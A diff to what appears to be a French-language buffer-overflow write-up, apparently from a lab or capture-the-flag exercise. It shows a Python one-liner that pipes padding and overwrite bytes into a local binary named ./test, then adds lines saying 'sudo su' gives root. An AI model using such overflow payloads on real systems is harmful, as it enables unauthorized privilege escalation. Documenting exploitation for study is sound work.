@@ -143,4 +143,13 @@ nous allons donc envoyer ceci :
 
 _python -c 'print ("123456789abcdefghijkl"+"\x20\x48\x55\x55\x55\x55")' | ./test_
 
-![Scan](https://user-images.githubusercontent.com/39098396/62122914-0f832600-b2c7-11e9-9bed-25cd02087321.png)
+nous voyons bien le lancement du debug 
+
+nous pouvons ensuite faire un sudo su 
+et nous somme root ! 
+
+![Scan](https://user-images.githubusercontent.com/39098396/62123614-9b498200-b2c8-11e9-98c8-4d3719e493c6.png)
+
+
+
+
